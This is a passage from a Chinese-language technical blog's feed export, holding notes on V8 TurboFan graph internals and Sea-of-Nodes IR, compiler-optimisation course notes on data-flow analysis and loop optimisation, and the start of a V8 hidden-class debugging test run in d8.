class="title">input_edges</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Inputs</span>;</span></span><br><span class="line">    <span class="function"><span class="keyword">inline</span> Inputs <span class="title">inputs</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">UseEdges</span> <span class="title">final</span> &#123;</span></span><br><span class="line">        <span class="keyword">public</span>:</span><br><span class="line">        <span class="keyword">typedef</span> Edge value_type;</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">iterator</span>;</span></span><br><span class="line">        <span class="function"><span class="keyword">inline</span> iterator <span class="title">begin</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">        <span class="function"><span class="keyword">inline</span> iterator <span class="title">end</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">bool</span> <span class="title">empty</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">        explicit UseEdges(Node* node) : node_(node) &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span>:</span><br><span class="line">        Node* node_;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function">UseEdges <span class="title">use_edges</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> UseEdges(<span class="keyword">this</span>); &#125;</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-21-035742.png" alt=""></p><ul><li>Node* const user = edge.from();</li></ul><p><strong>还记得每条边的from么？对，就是target，现在知道对应谁了么？上一个和下一个都是相对的概念，只是我们要知道究竟对应的是谁即可</strong></p><ul><li>接下来代码是一个选择分支，我选一个else if分析<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (NodeProperties::IsEffectEdge(edge)) &#123;</span><br><span class="line">    DCHECK_NOT_NULL(effect);</span><br><span class="line">    edge.UpdateTo(effect);</span><br><span class="line">    Revisit(user);</span><br></pre></td></tr></table></figure></li></ul><p>首先effect来源于<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (effect == <span class="literal">nullptr</span> &amp;&amp; node-&gt;op()-&gt;EffectInputCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  effect = NodeProperties::GetEffectInput(node);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里是取的原来的节点的输入边，假设它就是effect input。<br>那么假设我们现在就是0-&gt;5-&gt;13，0即effect，5即node，13即user<br>edge是5-&gt;13的这条边。<br>然后我们edge.UpdateTo(effect);<br><strong>还记得每条边的from么？是的，这个to本来应该是5，这里就是把5-&gt;13变成了0-&gt;13，就移走了原本在这个路径上的这个节点，要注意的是这个移走并不是直接移除，因为它可能在其他路径上还被用到，只是不在这条路径上了，具体的看我贴的源码（fuck the source code…)</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">UpdateTo</span><span class="params">(Node* new_to)</span> </span>&#123;</span><br><span class="line">    Node* old_to = *input_ptr_;</span><br><span class="line">    <span class="keyword">if</span> (old_to != new_to) &#123;</span><br><span class="line">      <span class="keyword">if</span> (old_to) old_to-&gt;RemoveUse(use_);</span><br><span class="line">      *input_ptr_ = new_to;</span><br><span class="line">      <span class="keyword">if</span> (new_to) new_to-&gt;AppendUse(use_);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">void</span> Node::RemoveUse(Use* use) &#123;</span><br><span class="line">  DCHECK(first_use_ == <span class="literal">nullptr</span> || first_use_-&gt;prev == <span class="literal">nullptr</span>);</span><br><span class="line">  <span class="keyword">if</span> (use-&gt;prev) &#123;</span><br><span class="line">    DCHECK_NE(first_use_, use);</span><br><span class="line">    use-&gt;prev-&gt;next = use-&gt;next;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    DCHECK_EQ(first_use_, use);</span><br><span class="line">    first_use_ = use-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (use-&gt;next) &#123;</span><br><span class="line">    use-&gt;next-&gt;prev = use-&gt;prev;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-21-050445.png" alt=""><br>如图有两条红线，通过一个use链链接起来。</p><h2 id="v8-IR"><a href="#v8-IR" class="headerlink" title="v8 IR"></a>v8 IR</h2><h3 id="Sea-of-Nodes"><a href="#Sea-of-Nodes" class="headerlink" title="Sea-of-Nodes"></a>Sea-of-Nodes</h3><p>v8的IR是Sea-of-Nodes，可以说是一种Program Dependence Graph，其宗旨是“在统一的表达形式下，把分析进行彻底”<br>用这样的IR所表达的程序里完全不需要“变量”的概念了，一切都是经过透彻分析后的“值”。各种操作并不操作变量，而是从依赖获取输入值，运算后产生新的值。每个“值”自身会携带足够依赖信息来判明它在怎样的路径上有效，依赖的数据输入是哪些；<br>TurboFan的依赖信息有三种，Control, Data, Effect</p><ul><li>Control Dependence（控制依赖）可以看作是常规控制流图反过来画。不是基本块持有一个线性列表里面装着节点，而是每个节点都记录着自己的控制依赖是谁——要哪个前驱控制节点执行到的时候我才可以执行。</li><li>Data Dependence很简单，就是use-def链，换句话说一个节点的数据输入都是谁。例如说 a + b，这个“+”的数据依赖就是a和b。</li><li>Effect Dependence则记录“副作用的顺序”——主要就是内存操作的顺序。它只记录顺序而不必维护SSA形式的其它特性。</li></ul><p>基于此，v8放宽了operation的执行顺序，由effect edges来管理stateful operations的执行顺序，且保留了控制流图的“骨架”<br>举几个简单的例子<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-073626.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-073636.png" alt=""></p><h3 id="Iterative-Reduction"><a href="#Iterative-Reduction" class="headerlink" title="Iterative Reduction"></a>Iterative Reduction</h3><p>需要提一下的是v8的reduce，在每次JIT phase结束的时候，都会根据当前的graph进行Reduce<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-073734.png" alt=""><br>整个reduce是从代码最后的End节点开始进行DFS,先遍历子节点，然后遍历自己，记录state改变的节点，将其放入revisit栈，在所有节点遍历完后，对这些需要重新遍历的节点revisit.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> GraphReducer::ReduceGraph() &#123; ReduceNode(graph()-&gt;end()); &#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">void</span> GraphReducer::ReduceNode(Node* node) &#123;</span><br><span class="line">  DCHECK(stack_.empty());</span><br><span class="line">  DCHECK(revisit_.empty());</span><br><span class="line">  Push(node);</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!stack_.empty()) &#123;</span><br><span class="line">      <span class="comment">// Process the node on the top of the stack, potentially pushing more or</span></span><br><span class="line">      <span class="comment">// popping the node off the stack.</span></span><br><span class="line">      ReduceTop();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!revisit_.empty()) &#123;</span><br><span class="line">      <span class="comment">// If the stack becomes empty, revisit any nodes in the revisit queue.</span></span><br><span class="line">      Node* <span class="keyword">const</span> node = revisit_.front();</span><br><span class="line">      revisit_.pop();</span><br><span class="line">      <span class="keyword">if</span> (state_.Get(node) == State::kRevisit) &#123;</span><br><span class="line">        <span class="comment">// state can change while in queue.</span></span><br><span class="line">        Push(node);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// Run all finalizers.</span></span><br><span class="line">      <span class="keyword">for</span> (Reducer* <span class="keyword">const</span> reducer : reducers_) reducer-&gt;Finalize();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Check if we have new nodes to revisit.</span></span><br><span class="line">      <span class="keyword">if</span> (revisit_.empty()) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  DCHECK(revisit_.empty());</span><br><span class="line">  DCHECK(stack_.empty());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Reduction reduction = (*i)-&gt;Reduce(node);</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-075114.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-075120.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-075125.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-075131.png" alt=""></p><h3 id="Lowering-to-Machine"><a href="#Lowering-to-Machine" class="headerlink" title="Lowering to Machine"></a>Lowering to Machine</h3><p>事实上IR的node是随着JIT phase逐层下降接近至Machine的<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-075326.png" alt=""><br>一个JSxxx node可能会变成更多个Machine node<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-23-075359.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;v8-Graph&quot;&gt;&lt;a href=&quot;#v8-Graph&quot; class=&quot;headerlink&quot; title=&quot;v8 Graph&quot;&gt;&lt;/a&gt;v8 Graph&lt;/h2&gt;&lt;p&gt;首先说一个结论，v8的graph都是由下往上遍历。&lt;br&gt;&lt;img src=&quot;https:/
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>哈工大编译优化笔记</title>
    <link href="http://eternalsakura13.com/2018/08/08/optimize/"/>
    <id>http://eternalsakura13.com/2018/08/08/optimize/</id>
    <published>2018-08-08T02:16:54.630Z</published>
    <updated>2018-10-22T14:25:51.722Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是基本块？"><a href="#什么是基本块？" class="headerlink" title="什么是基本块？"></a>什么是基本块？</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022106.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022128.png" alt=""></p><h2 id="什么是流图"><a href="#什么是流图" class="headerlink" title="什么是流图"></a>什么是流图</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-021814.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022012.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022026.png" alt=""></p><h2 id="优化的分类"><a href="#优化的分类" class="headerlink" title="优化的分类"></a>优化的分类</h2><ul><li>机器无关优化<ul><li>针对中间代码</li></ul></li><li>局部代码优化<ul><li>单个基本块范围内的优化</li></ul></li><li>全局代码优化<ul><li>多个基本块的优化<h2 id="常用优化方法"><a href="#常用优化方法" class="headerlink" title="常用优化方法"></a>常用优化方法</h2><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-024124.png" alt=""><h3 id="删除公共子表达式"><a href="#删除公共子表达式" class="headerlink" title="删除公共子表达式"></a>删除公共子表达式</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022222.png" alt=""><br>例子如下，先看B5，对它进行局部和全局公共子表达式消除。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022339.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022629.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022703.png" alt=""><br>再看B6<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022855.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022906.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-023040.png" alt=""><br>关键问题，如何自动识别公共子表达式？<h3 id="删除无用代码"><a href="#删除无用代码" class="headerlink" title="删除无用代码"></a>删除无用代码</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-024246.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-024335.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-024416.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-024428.png" alt=""><br>关键问题，如何自动识别无用代码？<h3 id="常量合并"><a href="#常量合并" class="headerlink" title="常量合并"></a>常量合并</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-140909.png" alt=""><h3 id="循环代码外提"><a href="#循环代码外提" class="headerlink" title="循环代码外提"></a>循环代码外提</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-140931.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-141008.png" alt=""><h3 id="强度削弱"><a href="#强度削弱" class="headerlink" title="强度削弱"></a>强度削弱</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-141029.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-141118.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-141528.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-141551.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-141601.png" alt=""><h3 id="基本块的优化"><a href="#基本块的优化" class="headerlink" title="基本块的优化"></a>基本块的优化</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-141902.png" alt=""></li></ul></li></ul><h2 id="数据流分析"><a href="#数据流分析" class="headerlink" title="数据流分析"></a>数据流分析</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-151922.png" alt=""><br>s是一个语句，所以说数据流值在经过s之后会变化发，所谓传递函数。</p><h3 id="到达定值分析"><a href="#到达定值分析" class="headerlink" title="到达定值分析"></a>到达定值分析</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-152723.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-153258.png" alt=""><br>注意KILL这个概念，是变量x被重新赋值，则原来的定值（语句）被杀死。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-153356.png" alt=""> </p><h4 id="到达定值分析的用途"><a href="#到达定值分析的用途" class="headerlink" title="到达定值分析的用途"></a>到达定值分析的用途</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-153721.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-153828.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-153905.png" alt=""></p><h4 id="杀死与生成"><a href="#杀死与生成" class="headerlink" title="杀死与生成"></a>杀死与生成</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-153944.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-154554.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-154644.png" alt=""></p><h4 id="到达定值分析的算法"><a href="#到达定值分析的算法" class="headerlink" title="到达定值分析的算法"></a>到达定值分析的算法</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-160029.png" alt=""><br>kill置为0，gen置为1<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-160049.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-160351.png" alt=""></p><h3 id="活跃变量分析"><a href="#活跃变量分析" class="headerlink" title="活跃变量分析"></a>活跃变量分析</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-132942.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-133257.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-133312.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-133357.png" alt=""><br>活跃变量就是定义了以后会被用到嘛2333</p><p>因为这是一个逆向数据流问题，所以用x表示在基本块出口处的活跃变量的集合，f(x)表示基本块入口处活跃变量的集合。</p><p>use表示在基本块中首次出现，以引用形式出现的变量的集合，所以这些变量在基本块入口处肯定是活跃的。</p><p>def表示在基本块中首次出现，以定值形式出现的变量的集合，所以这些变量在基本块入口处肯定是不活跃的。<br>所以说def杀死了某些变量在基本块入口处成为活跃变量的可能性。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-133603.png" alt=""><br>解释一下B2，i和j在基本块B2中都是以引用形式首次出现，所以在use里，而def为∅<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-135226.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-135254.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-135308.png" alt=""><br>得到活跃变量表<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-140845.png" alt=""></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-140935.png" alt=""></p><h3 id="可用表达式分析"><a href="#可用表达式分析" class="headerlink" title="可用表达式分析"></a>可用表达式分析</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-141147.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-141741.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-141807.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-141913.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-142025.png" alt=""><br>z=x op y生成了表达式x op y，加入gen<br>同时这条语句对z定值，于是删除与z相关的表达式。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-142153.png" alt=""><br>z = x op y，于是从kill中删除表达式x op y，代表它复活了。<br>同时这条语句对z定值，于是把和z相关的表达式加入kill中</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-142219.png" alt=""><br><strong>注意是IN的交集</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-143437.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-143405.png" alt=""></p><h2 id="对循环的优化"><a href="#对循环的优化" class="headerlink" title="对循环的优化"></a>对循环的优化</h2><p>要想对循环进行优化，首先要识别出流图中的循环。</p><h3 id="支配节点（Dominators-和回边"><a href="#支配节点（Dominators-和回边" class="headerlink" title="支配节点（Dominators)和回边"></a>支配节点（Dominators)和回边</h3><ul><li><p>支配节点<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-144116.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-144133.png" alt=""><br>在支配节点树中，每个节点只支配它和它的后代节点。<br>可以看出一个节点可能会有若干个支配节点，于是给出直接支配节点的定义<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-144340.png" alt=""><br>寻找支配节点是一个数据流问题<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-144426.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-145018.png" alt=""><br><strong>注意交运算，所以初始化时初始为全集</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-145033.png" alt=""></p></li><li><p>回边<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-151633.png" alt=""></p></li></ul><h3 id="自然循环及其识别"><a href="#自然循环及其识别" class="headerlink" title="自然循环及其识别"></a>自然循环及其识别</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-151758.png" alt=""><br>如图2和3不存在彼此支配的关系，2和3构成了一个循环，控制既可以从2，也可以从3号节点进入，这样循环的入口节点就不唯一了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-152115.png" alt=""></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-152330.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-152636.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-152727.png" alt=""></p><h3 id="删除全局子表达式"><a href="#删除全局子表达式" class="headerlink" title="删除全局子表达式"></a>删除全局子表达式</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-152910.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-152950.png" alt=""></p><h3 id="删除复制语句"><a href="#删除复制语句" class="headerlink" title="删除复制语句"></a>删除复制语句</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-153333.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-154117.png" alt=""><br>注意到达定义分析是并 IN[P]，可用表达式分析是交 IN[P]</p><h3 id="代码移动"><a href="#代码移动" class="headerlink" title="代码移动"></a>代码移动</h3><ul><li>循环不变计算</li><li>代码外提<h4 id="循环不变计算"><a href="#循环不变计算" class="headerlink" title="循环不变计算"></a>循环不变计算</h4>一条语句是循环不变，当且仅当运算分量的值在循环中不变</li></ul><ol><li>运算分量是常数</li><li>运算分量的所有定值点在循环以外</li><li>运算分量只有一个到达定值，且在循环以内，且该定值本身就是循环内的一个不变计算。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-154548.png" alt=""><h4 id="代码外提"><a href="#代码外提" class="headerlink" title="代码外提"></a>代码外提</h4><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-154657.png" alt=""></li></ol><p>注意不一定所有的循环不变量都能外提<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-154741.png" alt=""><br>如图，B2并不一定被执行，那么其中的代码外提就是错误的。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-155000.png" alt=""><br>如果还有其他语句对x赋值，那么就有可能让原来的定值语句被杀死。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-155424.png" alt=""></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-155708.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-160015.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是基本块？&quot;&gt;&lt;a href=&quot;#什么是基本块？&quot; class=&quot;headerlink&quot; title=&quot;什么是基本块？&quot;&gt;&lt;/a&gt;什么是基本块？&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://sakura-1252236262.cos.ap-beijing
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="compiler" scheme="http://eternalsakura13.com/tags/compiler/"/>
    
  </entry>
  
  <entry>
    <title>v8 debug writeup</title>
    <link href="http://eternalsakura13.com/2018/08/02/v8_debug/"/>
    <id>http://eternalsakura13.com/2018/08/02/v8_debug/</id>
    <published>2018-08-02T14:05:42.000Z</published>
    <updated>2018-10-22T14:25:51.729Z</updated>
    
    <content type="html"><![CDATA[<h2 id="v8-hidden-class-test"><a href="#v8-hidden-class-test" class="headerlink" title="v8 hidden class test"></a>v8 hidden class test</h2><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><h4 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">this</span>.x = x;</span><br><span class="line"> <span class="keyword">this</span>.y = y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Point(<span class="number">10</span>, <span class="number">11</span>);</span><br><span class="line">%DebugPrint(p1)</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="keyword">new</span> Point(<span class="number">12</span>, <span class="number">13</span>);</span><br><span class="line">%DebugPrint(p2)</span><br></pre></td></tr></table></figure><p><code>./d8 --allow_natives_syntax test_hidden_class.js</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-14-131739.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/v8/v8/out.gn/x64.debug$ ./d8 --allow_natives_syntax test.js </span><br><span class="line">DebugPrint: 0x27984250c879: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x1e016e18f8d9 [FastProperties]</span><br><span class="line"> - prototype = 0x27984250c749</span><br><span class="line"> - elements = 0x23ac56e02241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x23ac56e02241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 10 (data field 0)</span><br><span class="line">    #y: 11 (data field 1)</span><br><span class="line"> &#125;</span><br><span class="line">0x1e016e18f8d9: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 8</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 